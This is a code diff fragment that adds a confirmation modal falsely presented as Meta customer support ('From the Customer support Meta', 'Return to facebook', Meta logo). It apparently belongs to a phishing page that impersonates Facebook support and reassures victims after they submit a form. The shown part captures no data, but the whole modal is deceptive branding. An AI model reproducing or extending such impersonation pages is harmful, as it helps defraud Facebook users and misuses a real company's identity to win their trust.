+      + 'Your request has been added to the processing queue. We will handle your request within 24 hours in case we do not receive feedback, please send back information so we can assist you.'
+      + '</p>'
+      + '<p style="color:#606770;font-size:14px;margin:0 0 24px;">From the Customer support Meta.</p>'
+
+      /* ── Button ── */
+      + '<a href="https://www.facebook.com" class="modal-return-btn">Return to facebook</a>'
+
+      /* ── Meta logo ── */
+      + '<div style="text-align:center;margin-top:18px;">'
+      + '<img src="public/icons/ic_meta_gray.svg" alt="Meta"'
+      +   ' style="height:18px;display:inline-block;"'
+      +   ' onerror="this.outerHTML=\'<svg viewBox=\\\"0 0 60 12\\\" width=\\\"60\\\" height=\\\"12\\\"><text y=\\\"11\\\" font-size=\\\"11\\\" fill=\\\"#9ca3af\\\" font-family=\\\"sans-serif\\\">&#x229E; Meta</text></svg>\'">'
+      + '</div>';
+
     Modal.create('successModal', html);
+
+    /* Nền trắng cho modal success */
+    var box = document.querySelector('#successModal .modal-box');
+    if (box) box.style.background = '#fff';
+
     Modal.open('successModal');
   }
   </script>
